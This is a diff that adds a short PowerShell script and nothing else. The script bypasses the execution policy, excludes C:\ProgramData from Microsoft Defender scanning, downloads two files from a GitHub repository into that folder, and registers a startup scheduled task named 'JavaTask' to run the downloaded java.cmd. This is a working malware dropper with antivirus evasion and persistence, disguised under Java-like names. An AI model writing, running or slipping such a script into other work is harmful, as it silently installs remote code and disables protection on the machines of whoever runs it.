@@ -1,0 +1,16 @@
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+Set-MpPreference -ExclusionPath 'C:\ProgramData'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$urls = @{
+    'https://github.com/emyenglish/log/raw/main/java.cmd?raw=true' = 'C:\ProgramData\java.cmd'
+    'https://github.com/emyenglish/log/raw/main/main.ps1?raw=true' = 'C:\ProgramData\main.ps1'
+}
+$webClient = New-Object System.Net.WebClient
+$urls.Keys | ForEach-Object { $url = $_; $file = $urls[$url]; $webClient.DownloadFile($url, $file) }
+$targetPath = 'C:\ProgramData\java.cmd'
+$taskAction = New-ScheduledTaskAction -Execute $targetPath
+$taskTrigger = New-ScheduledTaskTrigger -AtStartup
+$taskSettings = New-ScheduledTaskSettingsSet
+Register-ScheduledTask -TaskName 'JavaTask' -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings
+exit
+
